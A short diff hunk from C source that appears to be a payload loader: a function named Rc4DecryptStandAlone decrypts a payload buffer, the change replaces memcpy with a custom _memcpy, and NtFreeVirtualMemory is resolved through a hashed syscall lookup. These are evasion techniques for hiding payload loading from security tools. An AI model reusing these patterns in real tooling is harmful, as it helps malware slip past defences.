@@ -63,7 +63,7 @@ BOOL Rc4DecryptStandAlone(
         USTRING Img = { .Buffer = decrypted, .Length = (USHORT)sPayloadSize, .MaximumLength = (USHORT)sPayloadSize };
 
         // Copy the payload data into allocated memory
-        memcpy(decrypted, pPayloadData, sPayloadSize);
+        _memcpy(decrypted, pPayloadData, sPayloadSize);
 
         NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscallHash(NtFreeVirtualMemory_JOAA);
         if (!pNtFreeVirtualMemory) {
